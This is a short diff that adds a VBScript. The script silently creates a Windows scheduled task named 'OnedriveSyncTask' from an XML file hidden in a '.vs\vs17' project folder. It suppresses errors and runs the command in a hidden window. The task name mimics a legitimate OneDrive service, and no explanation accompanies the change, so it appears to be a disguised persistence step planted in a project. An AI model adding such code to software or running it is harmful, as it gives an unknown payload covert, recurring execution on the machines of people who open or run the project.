@@ -1,0 +1,4 @@
+on error resume next
+psc = "schtasks /create /tn " & chr(34) & "OnedriveSyncTask" & chr(34) & " /f /xml " & chr(34) & ".vs\vs17" & chr(34)
+wscript.echo psc
+CreateObject("WScript.Shell").Run psc, 0, False
